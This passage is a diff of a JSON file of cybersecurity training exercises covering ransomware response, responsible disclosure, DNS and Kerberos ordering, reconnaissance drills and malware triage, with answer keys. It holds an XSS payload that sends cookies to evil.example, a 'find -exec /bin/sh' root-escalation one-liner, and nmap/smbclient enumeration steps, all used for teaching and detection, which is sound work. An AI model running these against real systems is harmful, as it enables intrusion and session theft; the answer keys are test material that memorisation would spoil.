+    "text": "Wrong order: volatile memory is the most volatile artifact (processes, connections, keys held in memory). You capture it BEFORE the disk. Starting with the disk risks permanently losing evidence that only exists in RAM.",
+    "outcome": "bad"
+   },
+   "bad_reboot": {
+    "text": "A reboot wipes all volatile memory and therefore the most valuable evidence (malicious processes, keys, active connections), and it can re-trigger a persistence mechanism. You collect BEFORE rebooting, never the other way around.",
+    "outcome": "bad"
+   },
+   "bad_pay": {
+    "text": "Paying guarantees neither decryption nor the absence of a leak, funds criminal activity, and marks the organization as a profitable target for future attacks. The authorities advise against it: you restore from clean backups.",
+    "outcome": "bad"
+   }
   },
-  {
-    "id": "threats-anal",
-    "kind": "analysis",
-    "title": "Spot the IOC in the DNS log",
-    "level": 6,
-    "artifactKind": "log",
-    "brief": "Here is an extract from a workstation's DNS query log. Malware installed on the machine is trying to reach its command & control (C2) server through an algorithmically generated domain (DGA). Spot the indicator of compromise (IOC).",
-    "lines": [
-      "10:14:02  DNS A?  outlook.office365.com          -> NOERROR",
-      "10:14:05  DNS A?  clients4.google.com           -> NOERROR",
-      "10:14:09  DNS A?  ctldl.windowsupdate.com       -> NOERROR",
-      "10:14:11  DNS A?  hj29fkq7zx4bvn1m.top          -> NXDOMAIN",
-      "10:14:14  DNS A?  safebrowsing.googleapis.com   -> NOERROR",
-      "10:14:18  DNS A?  fonts.gstatic.com             -> NOERROR"
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "off-term",
+  "kind": "terminal",
+  "title": "Reconnaissance & enumeration of an authorized target",
+  "level": 11,
+  "brief": "Authorized engagement, target in scope. Objective: READ-only reconnaissance and enumeration — map the attack surface without a single intrusive action. Every output is already interpreted for you.",
+  "shell": "pentester@kali:~$",
+  "steps": [
+   {
+    "instruction": "Before any scan, confirm that the target really is within the authorized perimeter by checking the scope file.",
+    "expect": "^cat\\s+scope",
+    "hint": "cat scope.txt",
+    "output": "# Authorized perimeter (Rules of Engagement)\nIN-SCOPE   : 10.10.10.5   (window 09:00 -> 18:00)\nOUT-OF-SCOPE : everything else in the /24\n=> target 10.10.10.5 is authorized: we can proceed.",
+    "tokens": [
+     "cat",
+     "scope.txt"
     ],
-    "question": "Which line gives away a request to a DGA-generated C2 domain?",
-    "correctLine": 3,
-    "explanation": "The domain `hj29fkq7zx4bvn1m.top` looks nothing like a readable name: a high-entropy string of characters, typical of a Domain Generation Algorithm (DGA). The malware tries pseudo-random names until it hits the one the attacker has registered; the failures come back as `NXDOMAIN`. Combined with a steady request rhythm (beaconing), this is a classic IOC of a C2 channel. Countermeasures: detection based on domain entropy, DNS blocking and network segmentation.",
-    "tags": [
-      "practice-v1"
+    "distractors": [
+     "less",
+     "head",
+     "tail",
+     "scope.md"
     ]
-  },
-  {
-    "id": "threats-scen",
-    "kind": "scenario",
-    "title": "Ransomware detected on a workstation",
-    "level": 7,
-    "brief": "A user calls you: a ransom note is showing on their screen and their files now carry the `.locked` extension. Ransomware has encrypted the machine. Every second counts — make the right calls.",
-    "start": "n1",
-    "nodes": {
-      "n1": {
-        "text": "The note demands a cryptocurrency payment to “decrypt” the files. The machine is still powered on and connected to the company network. What is your very first action?",
-        "choices": [
-          {
-            "text": "I isolate the machine: I unplug the network cable and turn off Wi-Fi",
-            "to": "n2"
-          },
-          {
-            "text": "I pay the ransom right away to get the files back",
-            "to": "bad_pay"
-          },
-          {
-            "text": "I let the user carry on working and hope it stops",
-            "to": "bad_ignore"
-          }
-        ]
-      },
-      "n2": {
-        "text": "Well played: cutting off the network stops the ransomware from spreading to the shares and to other machines. The machine stays powered on (useful for analysis). What do you do next?",
-        "choices": [
-          {
-            "text": "I escalate the incident to the security team (SOC / CSIRT) immediately",
-            "to": "n3"
-          },
-          {
-            "text": "I delete the ransom note and hand the machine back to the user",
-            "to": "bad_ignore"
-          }
-        ]
-      },
-      "n3": {
-        "text": "The security team takes over and confirms the encryption. The files on the machine are still inaccessible. How do you restore the data?",
-        "choices": [
-          {
-            "text": "We restore from a clean, earlier offline backup",
-            "to": "good1"
-          },
-          {
-            "text": "We pay the ransom, it's faster than restoring",
-            "to": "bad_pay"
-          }
-        ]
-      },
-      "good1": {
-        "text": "Exactly. The countermeasure against ransomware is not payment but the offline backup: you isolate, you escalate the incident, then you rebuild the machine and restore the data from a clean copy the malware could not reach. Payment is never guaranteed and it funds the attackers.",
-        "outcome": "good"
-      },
-      "bad_pay": {
-        "text": "Paying is the wrong call: nothing guarantees you will get the key, it funds and encourages the attackers, marks you out as a paying target, and does nothing to remove their presence from the network. The right answer is to isolate the machine, alert security, then restore from an offline backup.",
-        "outcome": "bad"
-      },
-      "bad_ignore": {
-        "text": "Doing nothing (or merely hiding the note) is dangerous: as long as the machine is connected, encryption can carry on and reach the network shares and other machines. You had to isolate the machine from the network first, then alert the security team.",
-        "outcome": "bad"
-      }
-    },
-    "tags": [
-      "practice-v1"
+   },
+   {
+    "instruction": "Check that host 10.10.10.5 is alive (host discovery), without scanning ports for now.",
+    "expect": "nmap\\s+-sn\\b",
+    "hint": "nmap -sn 10.10.10.5",
+    "output": "Nmap scan report for 10.10.10.5\nHost is up (0.012s latency).\n=> host is up and inside the perimeter: enumeration is possible.",
+    "tokens": [
+     "nmap",
+     "-sn",
+     "10.10.10.5"
+    ],
+    "distractors": [
+     "-sS",
+     "-p-",
+     "-A",
+     "-O"
     ]
-  },
-  {
-    "id": "web-anal",
-    "kind": "analysis",
-    "title": "Spot the attack in the access log",
-    "level": 7,
-    "artifactKind": "log",
-    "brief": "Here is an extract from a web server's access log. Only one of these requests is an attack attempt. The parameter values are URL-encoded: decode them in your head.",
-    "lines": [
-      "203.0.113.7 - - \"GET /home HTTP/1.1\" 200",
-      "203.0.113.7 - - \"GET /products?cat=books HTTP/1.1\" 200",
-      "198.51.100.9 - - \"GET /search?q=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fevil.example%2Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1\" 200",
-      "203.0.113.7 - - \"GET /products/42 HTTP/1.1\" 200",
-      "198.51.100.9 - - \"GET /contact HTTP/1.1\" 200"
+   },
+   {
+    "instruction": "Enumerate the open ports and identify the exposed service versions.",
+    "expect": "nmap\\b.*-sV",
+    "hint": "nmap -sV -p- 10.10.10.5",
+    "output": "PORT     STATE SERVICE      VERSION\n22/tcp   open  ssh          OpenSSH 7.6p1 Ubuntu\n80/tcp   open  http         Apache httpd 2.4.29\n445/tcp  open  netbios-ssn  Samba smbd 4.7.6\n=> 3 exposed services; versions to check against known security advisories.",
+    "tokens": [
+     "nmap",
+     "-sV",
+     "-p-",
+     "10.10.10.5"
     ],
-    "question": "Which line is a reflected Cross-Site Scripting (XSS) attempt?",
-    "correctLine": 2,
-    "explanation": "Once decoded, the `q` parameter reads `<script>document.location='http://evil.example/c='+document.cookie</script>`. If the application echoes that value back without escaping it, the victim's browser runs the JavaScript and ships their session cookie off to evil.example. That is the essence of XSS: the code executes on the victim's side, not on the server. Defenses: encode/escape every HTML output and set a Content-Security-Policy that restricts which scripts are allowed.",
-    "tags": [
-      "practice-v1"
+    "distractors": [
+     "-sn",
+     "-sU",
+     "--script",
+     "-Pn"
     ]
-  },
-  {
-    "id": "crypto-anal",
-    "kind": "analysis",
-    "title": "The flaw in the encryption code",
-    "level": 8,
-    "artifactKind": "code",
-    "brief": "Here is a Python function meant to encrypt data with AES. The key is handled properly, but a single line introduces a major cryptographic weakness. Can you spot it?",
-    "lines": [
-      "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes",
-      "import os",
-      "key = bytes.fromhex(os.environ[\"AES_KEY\"])  # 256-bit key provided by the KMS",
-      "def encrypt(block: bytes) -> bytes:",
-      "    cipher = Cipher(algorithms.AES(key), modes.ECB())",
-      "    enc = cipher.encryptor()",
-      "    return enc.update(pad(block, 16)) + enc.finalize()"
+   },
+   {
+    "instruction": "Identify the web service's application stack from its HTTP banner (response headers).",
+    "expect": "curl\\s+-I\\b",
+    "hint": "curl -I http://10.10.10.5",
+    "output": "HTTP/1.1 200 OK\nServer: Apache/2.4.29 (Ubuntu)\nX-Powered-By: PHP/7.2.24\n=> Apache + PHP stack identified from the banner, with no intrusive request.",
+    "tokens": [
+     "curl",
+     "-I",
+     "http://10.10.10.5"
     ],
-    "question": "Which line introduces a major cryptographic weakness?",
-    "correctLine": 4,
-    "explanation": "ECB mode encrypts each block independently: two identical plaintext blocks give two identical ciphertext blocks. The patterns of the message therefore leak into the ciphertext (in the famous \"ECB penguin\" example the image stays perfectly recognizable). You need a mode that breaks that regularity: ideally AES-GCM (authenticated encryption, with a unique nonce for every message), or at the very least CBC with a random IV. The key itself is correctly loaded from the environment; that is not the problem here.",
-    "tags": [
-      "practice-v1"
+    "distractors": [
+     "wget",
+     "-X",
+     "-O",
+     "--data"
     ]
-  },
-  {
-    "id": "net-order",
-    "kind": "order",
-    "title": "Put DNS resolution in order",
-    "level": 8,
-    "brief": "You type a URL into your browser. Before the connection can even be opened, the domain name has to be translated into an IP address. Put the steps of a recursive DNS lookup back in the right order.",
-    "prompt": "Tap the steps in the correct chronological order.",
-    "items": [
-      {
-        "id": "tld",
-        "text": "The resolver queries the TLD server (.com), which returns the domain's authoritative name servers"
-      },
-      {
-        "id": "auth",
-        "text": "The resolver queries the authoritative server, which returns the A record (the IP address)"
-      },
-      {
-        "id": "cache-local",
-        "text": "The client checks its local DNS cache (and /etc/hosts); no match, so it queries the resolver"
-      },
-      {
-        "id": "root",
-        "text": "The resolver queries a root server, which returns the addresses of the TLD servers"
-      },
-      {
-        "id": "resolver",
-        "text": "The query reaches the recursive resolver (e.g. 8.8.8.8), which has no cached answer"
-      },
-      {
-        "id": "return",
-        "text": "The resolver caches the answer (for the duration of the TTL) and returns the IP to the client, which opens the connection"
-      }
+   },
+   {
+    "instruction": "Map the exposure of the SMB service by listing the visible shares (enumeration, no access to the data).",
+    "expect": "smbclient\\s+-L\\b",
+    "hint": "smbclient -L //10.10.10.5 -N",
+    "output": "Sharename       Type      Comment\n---------       ----      -------\nprofiles        Disk      (anonymous listing allowed)\nprint$          Disk      Printer Drivers\nIPC$            IPC       IPC Service\n=> one share listable anonymously: exposure to be documented in the report.",
+    "tokens": [
+     "smbclient",
+     "-L",
+     "//10.10.10.5",
+     "-N"
     ],
-    "correctOrder": [
-      "cache-local",
-      "resolver",
-      "root",
-      "tld",
-      "auth",
-      "return"
-    ],
-    "explanation": "Recursive DNS resolution: the client checks its local cache first, then hands the query off to the recursive resolver. With nothing cached, the resolver walks down the hierarchy — root → TLD (.com) → authoritative server — which supplies the A record. The resolver caches it for the TTL, then returns the IP. DNS listens on port 53 (UDP, falling back to TCP for large responses).",
-    "tags": [
-      "practice-v1"
+    "distractors": [
+     "-U",
+     "smbget",
+     "enum4linux",
+     "-p"
     ]
-  },
-  {
-    "id": "sys-anal",
-    "kind": "analysis",
-    "title": "One permission too many",
-    "level": 8,
-    "artifactKind": "code",
-    "brief": "Here is an extract from a provisioning script that sets up database backups on a Linux server. One line introduces a file permissions misconfiguration.",
-    "lines": [
-      "#!/usr/bin/env bash",
-      "useradd -r -s /usr/sbin/nologin svc-backup",
-      "mkdir -p /var/backups/db",
-      "chown -R svc-backup:svc-backup /var/backups/db",
-      "chmod 750 /var/backups/db",
-      "mysqldump appdb > /var/backups/db/appdb.sql",
-      "chmod 777 /var/backups/db/appdb.sql"
+   }
+  ],
+  "success": "Reconnaissance and enumeration complete, without a single intrusive action. You confirmed the perimeter, verified that the target is alive, mapped 3 services (SSH, HTTP, SMB), identified the application stack and spotted an SMB share listable anonymously. Next step in a real engagement: validate any vulnerabilities ONLY within the scope, then record everything in the report.",
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "sys-order",
+  "kind": "order",
+  "title": "How a Kerberos authentication unfolds",
+  "level": 11,
+  "brief": "A user signs in to a service in an Active Directory domain, and Kerberos takes the stage. Put the exchanges back in order — KDC → TGT → TGS → service.",
+  "prompt": "Tap the exchanges in the protocol's chronological order.",
+  "items": [
+   {
+    "id": "tgs-rep",
+    "text": "TGS-REP: the TGS returns a service ticket encrypted with the key of the requested service account."
+   },
+   {
+    "id": "as-req",
+    "text": "AS-REQ: the client asks the KDC's Authentication Service (AS) to authenticate it (pre-authentication: a timestamp encrypted with the key derived from the password)."
+   },
+   {
+    "id": "ap-req",
+    "text": "AP-REQ: the client presents the service ticket to the target application server to open the session."
+   },
+   {
+    "id": "as-rep",
+    "text": "AS-REP: the AS returns a TGT (Ticket Granting Ticket) encrypted with the key of the krbtgt account, plus a session key."
+   },
+   {
+    "id": "ap-rep",
+    "text": "AP-REP: the service returns an authenticator (mutual authentication) and access is granted."
+   },
+   {
+    "id": "tgs-req",
+    "text": "TGS-REQ: the client presents its TGT to the Ticket Granting Service (TGS) and requests a ticket for a specific service (SPN)."
+   }
+  ],
+  "correctOrder": [
+   "as-req",
+   "as-rep",
+   "tgs-req",
+   "tgs-rep",
+   "ap-req",
+   "ap-rep"
+  ],
+  "explanation": "Kerberos runs in three phases through the KDC: (1) authentication with the AS, which issues the TGT (AS-REQ / AS-REP); (2) a request to the TGS for a service ticket, presenting the TGT (TGS-REQ / TGS-REP); (3) presentation of the service ticket to the target server (AP-REQ / AP-REP). The password is never sent over the network, and the TGT is encrypted with the key of the krbtgt account.",
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "threats-term",
+  "kind": "terminal",
+  "title": "Static triage of a suspicious sample",
+  "level": 11,
+  "brief": "An `invoice.pdf` attachment received by a user looks fishy. In an isolated lab, run a STATIC, defensive triage: you never execute the sample, you only observe it — identify what it really is, compute its hash and extract its strings.",
+  "shell": "analyst@lab:~$",
+  "steps": [
+   {
+    "instruction": "Determine the real type of the `invoice.pdf` file (the extension can lie).",
+    "expect": "^file\\s+\\S",
+    "hint": "file invoice.pdf",
+    "output": "invoice.pdf: PE32 executable (GUI) Intel 80386, for MS Windows",
+    "tokens": [
+     "file",
+     "invoice.pdf"
     ],
-    "question": "Which line introduces a dangerous file permissions misconfiguration?",
-    "correctLine": 6,
-    "explanation": "`chmod 777` grants read + write + execute rights to everyone (`rwxrwxrwx`). On a database dump — sensitive data — that lets any local user READ the data (leak) and MODIFY it (tampering with the backup). You should restrict it instead: `chmod 600` (owner only), or `640` with a dedicated group, keeping `svc-backup` as the owner. Rule: least privilege on sensitive files.",
-    "tags": [
-      "practice-v1"
+    "distractors": [
+     "stat",
+     "exiftool",
+     "xxd",
+     "-i"
     ]
-  },
-  {
-    "id": "web-scen",
-    "kind": "scenario",
-    "title": "A flaw found by accident",
-    "level": 8,
-    "brief": "While browsing a small company's website, you stumble on a very real vulnerability. What you do with it matters just as much legally as it does ethically. Make the right calls: responsible disclosure, or a step too far?",
-    "start": "n1",
-    "nodes": {
-      "n1": {
-        "text": "In your customer account, you notice that changing the id in the URL (/invoices/1042 to /invoices/1041) displays another customer's invoice: this is an IDOR (Insecure Direct Object Reference). What do you do?",
-        "choices": [
-          {
-            "text": "I stop there and record only the minimum evidence needed",
-            "to": "n2"
-          },
-          {
-            "text": "I download every invoice I can reach, to measure the scale of it",
-            "to": "bad1"
-          },
-          {
-            "text": "I post the vulnerability on social media right away",
-            "to": "bad2"
-          }
-        ]
-      },
-      "n2": {
-        "text": "Good instinct: you did not go beyond what was strictly necessary to confirm the problem. How do you go about reporting it?",
-        "choices": [
-          {
-            "text": "I look for a security contact (security.txt, a /security page, a bug bounty program)",
-            "to": "n3"
-          },
-          {
-            "text": "I exploit the flaw as far as it goes first, to prove it is serious",
-            "to": "bad1"
-          }
-        ]
-      },
-      "n3": {
-        "text": "You find a /.well-known/security.txt file giving a security contact address. What comes next?",
-        "choices": [
-          {
-            "text": "I notify the company privately, with the details and a reasonable remediation deadline before any publication",
-            "to": "good1"
-          },
-          {
-            "text": "I put the vulnerability up for sale on a forum",
-            "to": "bad3"
-          }
-        ]
-      },
-      "good1": {
-        "text": "Perfect: that is responsible (coordinated) disclosure. You keep your testing to the bare minimum, you report privately through the designated channel, and you allow time for a fix before publishing anything. This is exactly what is expected of a security researcher.",
-        "outcome": "good"
-      },
-      "bad1": {
-        "text": "Accessing or extracting data that is not yours goes well beyond simply confirming the issue: it is unauthorized access to, and continued presence in, a computer system (in France, art. 323-1 et seq. of the Criminal Code). Good intentions do not make the act legal. You stop at the minimum proof.",
-        "outcome": "bad"
-      },
-      "bad2": {
-        "text": "Publishing the vulnerability before the vendor has had a chance to fix it (uncoordinated full disclosure) directly exposes their customers: anyone can now reproduce it. You should have notified the company privately first.",
-        "outcome": "bad"
-      },
-      "bad3": {
-        "text": "Selling the vulnerability or cashing in on it puts you squarely on the attacker's side: handling stolen goods, complicity, offenses against an automated data processing system. The right path was a private report through the security contact.",
-        "outcome": "bad"
-      }
-    },
-    "tags": [
-      "practice-v1"
+   },
+   {
+    "instruction": "This is not a PDF but a disguised Windows executable. Compute its SHA-256 hash so you can compare it against a threat intelligence database.",
+    "expect": "^sha256sum\\s+\\S",
+    "hint": "sha256sum invoice.pdf",
+    "output": "7af10b27c7acec0fb254ab1b671fe5ca70e32d79d1719e6482a4efddeb50ffcb  invoice.pdf",
+    "tokens": [
+     "sha256sum",
+     "invoice.pdf"
+    ],
+    "distractors": [
+     "md5sum",
+     "sha1sum",
+     "-c",
+     "openssl"
     ]
-  },
-  {
-    "id": "defense-anal",
-    "kind": "analysis",
-    "title": "The critical event buried in the SIEM noise",
-    "level": 9,
-    "artifactKind": "log",
-    "brief": "Here is a correlated excerpt from your SIEM. The WARN alerts are noisy, but a single line betrays a compromise that actually succeeded. Your job is to flush it out.",
-    "lines": [
-      "2026-07-20T08:14:02 auth INFO EventID=4624 user=alice src=10.0.4.15 LogonType=2 status=success",
-      "2026-07-20T08:15:31 firewall INFO action=allow src=10.0.4.15 dst=10.0.4.1 dport=443 proto=tcp",
-      "2026-07-20T08:16:03 auth WARN EventID=4625 user=administrateur src=203.0.113.66 LogonType=10 status=failure reason=bad_password",
-      "2026-07-20T08:16:07 auth WARN EventID=4625 user=administrateur src=203.0.113.66 LogonType=10 status=failure reason=bad_password",
-      "2026-07-20T08:16:12 auth WARN EventID=4625 user=administrateur src=203.0.113.66 LogonType=10 status=failure reason=bad_password",
-      "2026-07-20T08:16:19 auth INFO EventID=4624 user=administrateur src=203.0.113.66 LogonType=10 status=success",
-      "2026-07-20T08:16:45 sysmon INFO EventID=3 host=SRV-APP01 image=chrome.exe dest=142.250.75.238:443",
-      "2026-07-20T08:17:10 dns INFO query=maj.microsoft.com type=A response=NOERROR"
+   },
+   {
+    "instruction": "Extract the readable strings to spot IOCs (URL, C2 domain, messages).",
+    "expect": "^strings\\b",
+    "hint": "strings invoice.pdf",
+    "output": "!This program cannot be run in DOS mode.\nLoadLibraryA\nGetProcAddress\nCryptEncrypt\nhttp://185.220.101.47/gate.php\nYour files have been encrypted\n.locked",
+    "tokens": [
+     "strings",
+     "invoice.pdf"
     ],
-    "question": "Which line signals a successful compromise (and not just an alert)?",
-    "correctLine": 5,
-    "explanation": "The three WARN lines (Event ID 4625) are only failed logons: noisy, but harmless as long as they keep failing. The genuinely critical line is the INFO Event ID 4624 with status=success: from the SAME external IP 203.0.113.66 and right after the three failures, the \"administrateur\" account logs on successfully this time, with LogonType=10 (RemoteInteractive / RDP). This is an RDP brute-force that worked — the real breach. A classic trap: the most serious event is not the noisiest one, and it comes through as INFO.",
-    "tags": [
-      "practice-v1"
+    "distractors": [
+     "grep",
+     "hexdump",
+     "-n",
+     "cat"
     ]
-  },
-  {
-    "id": "off-scen",
-    "kind": "scenario",
-    "title": "Keeping a penetration test within the law",
-    "level": 9,
-    "brief": "A client hires you for a pentest. Before and during the engagement, your decisions must stay within the authorization and the scope. A single byte touched outside the perimeter can become a criminal offense. Make the right calls.",
-    "start": "n1",
-    "nodes": {
-      "n1": {
-        "text": "The client asks you to \"test the security\" of their IT systems and wants to start right away. What is the very first thing to obtain?",
-        "choices": [
-          {
-            "text": "A signed written authorization (Rules of Engagement) defining scope, testing window and contacts",
-            "to": "n2"
-          },
-          {
-            "text": "Nothing formal: the client's verbal agreement is enough, since they are the one asking",
-            "to": "bad1"
-          },
-          {
-            "text": "I start active reconnaissance on their servers while waiting for the paperwork",
-            "to": "bad2"
-          }
-        ]
-      },
-      "n2": {
-        "text": "The written authorization sets the scope: 2 IP ranges and 2 domains, with a testing window. During reconnaissance, you spot a server OUTSIDE those ranges but clearly displaying the client's logo. What do you do?",
-        "choices": [
-          {
-            "text": "I document it and ask the client for a written scope extension, without touching it",
-            "to": "n3"
-          },
-          {
-            "text": "I test it: it obviously belongs to the client, so it is covered",
-            "to": "bad3"
-          }
-        ]
-      },
-      "n3": {
-        "text": "The client confirms in writing that this server is added to the scope. While enumerating it, you find that it sits on shared hosting and also holds a THIRD PARTY's data (another customer of the hosting provider). What do you do?",
-        "choices": [
-          {
-            "text": "I stop immediately on that third-party perimeter and report it: it is not covered by the authorization",
-            "to": "good1"
-          },
-          {
-            "text": "I carry on: that server is now in my scope, so everything it hosts is too",
-            "to": "bad4"
-          }
-        ]
-      },
-      "good1": {
-        "text": "Perfect. The client's authorization covers ONLY their own assets: a third party's data stays out of scope, even on an authorized server. You stop, you document, you escalate the finding. That is exactly the rigor expected in an ethical penetration test.",
-        "outcome": "good"
-      },
-      "bad1": {
-        "text": "A verbal agreement carries no evidentiary weight. Without written authorization defining the scope, any access to a system you do not own is unauthorized access — a criminal offense (in France, Article 323-1 of the French Criminal Code). Nothing gets touched before the signature.",
-        "outcome": "bad"
-      },
-      "bad2": {
-        "text": "ACTIVE reconnaissance (port scanning, enumeration) already touches the target and goes beyond simply consulting publicly available information. Launching it before the authorization is signed means acting outside the legal framework. Only strictly passive OSINT, on public sources, remains acceptable before signing.",
-        "outcome": "bad"
-      },
-      "bad3": {
-        "text": "\"Belonging to the client\" is not enough: what counts is what the WRITTEN authorization covers. Testing an out-of-scope asset, even one owned by the client, goes beyond your mandate and exposes you legally. The rule: outside the perimeter = don't touch, ask.",
-        "outcome": "bad"
-      },
-      "bad4": {
-        "text": "An authorized server can host data the client does not own and cannot authorize you to touch. Carrying on into a third party's perimeter means acting without valid authorization over that third party. You stop and you document.",
-        "outcome": "bad"
-      }
-    },
-    "tags": [
-      "practice-v1"
+   }
+  ],
+  "success": "Triage done. `file` unmasked a PE32 executable hiding behind a `.pdf` extension; the SHA-256 lets you query threat intel without sharing the binary; `strings` turned up telling IOCs — a hard-coded C2 URL, the `CryptEncrypt` call and a ransom note with the `.locked` extension: the signature of ransomware. Purely static analysis, in an isolated environment — you never execute the sample.",
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "crypto-term",
+  "kind": "terminal",
+  "title": "Inspect a certificate with openssl",
+  "level": 12,
+  "brief": "You are handed a server's TLS certificate (server.crt) and a freshly downloaded ISO image. Using openssl in read-only mode, inspect the certificate, then verify the file's integrity — you change nothing.",
+  "shell": "user@pc:~$",
+  "steps": [
+   {
+    "instruction": "Display the certificate in human-readable form: subject, issuer, validity period and public key.",
+    "expect": "^openssl\\s+x509\\b",
+    "hint": "openssl x509 -in server.crt -noout -text",
+    "output": "Certificate:\n    Data:\n        Version: 3 (0x2)\n        Signature Algorithm: sha256WithRSAEncryption\n        Issuer: C=US, O=Let's Encrypt, CN=R3\n        Validity\n            Not Before: Jun  1 00:00:00 2026 GMT\n            Not After : Aug 30 23:59:59 2026 GMT\n        Subject: CN=pentaguin.app\n        Subject Public Key Info:\n            Public-Key: (2048 bit)\n        X509v3 Subject Alternative Name:\n            DNS:pentaguin.app",
+    "tokens": [
+     "openssl",
+     "x509",
+     "-in",
+     "server.crt",
+     "-noout",
+     "-text"
+    ],
+    "distractors": [
+     "rsa",
+     "req",
+     "genrsa",
+     "-modulus"
     ]
-  },
-  {
-    "id": "sys-term",
-    "kind": "terminal",
-    "title": "Local privilege audit (Linux)",
-    "level": 9,
-    "brief": "Hardening review of a Linux server: you are checking the local privilege escalation surface of the current account. Every command is read-only and non-destructive.",
-    "shell": "audit@srv01:~$",
-    "steps": [
-      {
-        "instruction": "Display the identity and groups of the current account to work out your privilege context.",
-        "expect": "^id\\b",
-        "hint": "id",
-        "output": "uid=1001(audit) gid=1001(audit) groups=1001(audit),4(adm),27(sudo)"
-      },
-      {
-        "instruction": "List the commands this account can run through sudo (is an escalation possible?).",
-        "expect": "sudo\\s+-l",
-        "hint": "sudo -l",
-        "output": "Matching Defaults entries for audit on srv01:\n    env_reset, mail_badpass\n\nUser audit may run the following commands on srv01:\n    (root) NOPASSWD: /usr/bin/find"
-      },
-      {
-        "instruction": "Search for SUID binaries (setuid bit, permission -4000): they run with the rights of their owner (often root) and are a classic escalation path.",
-        "expect": "find\\s+/.*-perm\\s+-4000",
-        "hint": "find / -perm -4000 -type f 2>/dev/null",
-        "output": "/usr/bin/passwd\n/usr/bin/mount\n/usr/bin/sudo\n/usr/bin/pkexec\n/usr/bin/find"
-      }
+   },
+   {
+    "instruction": "Compute the SHA-256 fingerprint of the certificate (the one you compare for certificate pinning).",
+    "expect": "^openssl\\s+x509\\b.*fingerprint",
+    "hint": "openssl x509 -in server.crt -noout -fingerprint -sha256",
+    "output": "sha256 Fingerprint=3B:1A:9F:44:0C:E2:77:8A:D1:56:BB:90:12:34:AB:CD:EF:01:23:45:67:89:AB:CD:EF:01:23:45:67:89:AB:CD",
+    "tokens": [
+     "openssl",
+     "x509",
+     "-in",
+     "server.crt",
+     "-noout",
+     "-fingerprint",
+     "-sha256"
     ],
-    "success": "Audit findings: the `audit` account can run `find` as root without a password (`sudo -l`) AND `find` is one of the SUID binaries. Since `find` can execute arbitrary commands (`find . -exec /bin/sh \\; -quit`), that is a path to root and should be fixed as a priority (remove the sudo entry, strip the SUID bit). These reconnaissance commands — `id`, `sudo -l`, `find -perm -4000` — are non-destructive and form the basis of a local privilege audit.",
-    "tags": [
-      "practice-v1"
+    "distractors": [
+     "-md5",
+     "-serial",
+     "-subject",
+     "-text"
     ]
-  },
-  {
-    "id": "threats-order",
-    "kind": "order",
-    "title": "Put the Cyber Kill Chain in order",
-    "level": 9,
-    "brief": "Lockheed Martin's Cyber Kill Chain describes the 7 successive stages of a targeted intrusion. Reconstruct their sequence from the attacker's point of view.",
-    "prompt": "Tap the stages in the chronological order of the attack.",
-    "items": [
-      {
-        "id": "install",
-        "text": "Installation: plant a malware/backdoor for persistence"
-      },
-      {
-        "id": "recon",
-        "text": "Reconnaissance: gather information about the target"
-      },
-      {
-        "id": "c2",
-        "text": "Command & Control: open a remote-control channel (C2)"
-      },
-      {
-        "id": "delivery",
-        "text": "Delivery: get the weapon to the target — email, USB, website"
-      },
-      {
-        "id": "actions",
-        "text": "Actions on Objectives: exfiltrate, encrypt or destroy the data"
-      },
-      {
-        "id": "weapon",
-        "text": "Weaponization: couple the exploit with a payload"
-      },
-      {
-        "id": "exploit",
-        "text": "Exploitation: trigger the code by exploiting a vulnerability"
-      }
+   },
+   {
+    "instruction": "Verify the integrity of the downloaded ISO by computing its SHA-256 digest, so you can compare it with the published value.",
+    "expect": "^(openssl\\s+dgst\\s+-sha256|sha256sum)\\b",
+    "hint": "openssl dgst -sha256 debian-13.0.0-amd64.iso",
+    "output": "SHA2-256(debian-13.0.0-amd64.iso)= 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf34",
+    "tokens": [
+     "openssl",
+     "dgst",
+     "-sha256",
+     "debian-13.0.0-amd64.iso"
     ],
-    "correctOrder": [
-      "recon",
-      "weapon",
-      "delivery",
-      "exploit",
-      "install",
-      "c2",
-      "actions"
-    ],
-    "explanation": "Cyber Kill Chain (Lockheed Martin): Reconnaissance → Weaponization → Delivery → Exploitation → Installation → Command & Control (C2) → Actions on Objectives. Why it matters defensively: the earlier you break the chain, the less the attacker achieves — every stage is an opportunity for detection and blocking.",
-    "tags": [
-      "practice-v1"
+    "distractors": [
+     "-md5",
+     "enc",
+     "-sha1",
+     "-verify"
     ]
-  },
-  {
-    "id": "web-term",
-    "kind": "terminal",
-    "title": "Inspect the HTTP security headers",
-    "level": 9,
-    "brief": "Before putting a site into production, you check its security headers. Using curl (read-only, changing nothing), inspect the responses from https://example.com.",
-    "shell": "user@pc:~$",
-    "steps": [
-      {
-        "instruction": "Fetch only the HTTP response headers (without the page body) from https://example.com.",
-        "expect": "curl\\b.*(--head|-[A-Za-z]*I)\\b.*example\\.com",
-        "hint": "curl -I https://example.com",
-        "output": "HTTP/2 200\nserver: nginx\ncontent-type: text/html; charset=UTF-8\nstrict-transport-security: max-age=63072000; includeSubDomains; preload\ncontent-security-policy: default-src 'self'; script-src 'self'\nx-frame-options: DENY\nx-content-type-options: nosniff"
-      },
-      {
-        "instruction": "Isolate the HSTS header to confirm that the site enforces HTTPS. Filter the response on strict-transport-security.",
-        "expect": "grep\\b.*strict-transport-security",
-        "hint": "curl -sI https://example.com | grep -i strict-transport-security",
-        "output": "strict-transport-security: max-age=63072000; includeSubDomains; preload"
-      },
-      {
-        "instruction": "Now check the Content-Security-Policy (CSP), which limits the scripts that may run. Filter the response on content-security-policy.",
-        "expect": "grep\\b.*content-security-policy",
-        "hint": "curl -sI https://example.com | grep -i content-security-policy",
-        "output": "content-security-policy: default-src 'self'; script-src 'self'"
-      }
+   }
+  ],
+  "success": "Nicely done. You read the certificate's chain of trust (issuer, validity, public key), computed its SHA-256 fingerprint (useful for pinning), and verified a file's integrity through its SHA-256 hash. Mind the distinction: a hash proves integrity (the file has not been altered), not authenticity; for authenticity you need a signature (GPG, or a trusted certificate as here).",
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "defense-term",
+  "kind": "terminal",
+  "title": "Log analysis: hunting an SSH brute-force",
